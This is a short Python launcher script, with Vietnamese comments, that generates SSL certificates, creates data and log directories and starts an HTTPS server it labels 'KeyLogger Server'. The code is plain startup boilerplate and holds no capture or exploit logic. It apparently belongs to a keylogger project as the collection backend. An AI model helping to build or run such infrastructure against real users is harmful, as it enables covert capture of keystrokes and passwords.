#!/usr/bin/env python3
"""
Script để chạy server trực tiếp
"""
import os
import sys
from pathlib import Path

# Thêm thư mục src vào path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

# Generate SSL certificates first
from generate_ssl import generate_ssl_cert
generate_ssl_cert()

from src.main import create_app

if __name__ == '__main__':
    # Tạo các thư mục cần thiết
    os.makedirs('data/database', exist_ok=True)
    os.makedirs('data/logs', exist_ok=True)
    os.makedirs('config/ssl', exist_ok=True)
    
    app = create_app()
    config = app.config['CONFIG']
    
    ssl_context = (
        os.path.abspath(config['server']['ssl_cert']),
        os.path.abspath(config['server']['ssl_key'])
    )
    
    print(f"Starting KeyLogger Server on {config['server']['host']}:{config['server']['port']}")
    print(f"SSL Cert: {ssl_context[0]}")
    print(f"SSL Key: {ssl_context[1]}")
    print(f"Database: {config['database']['path']}")
    
    app.run(
        host=config['server']['host'],
        port=config['server']['port'],
        debug=config['server']['debug'],
        ssl_context=ssl_context
    )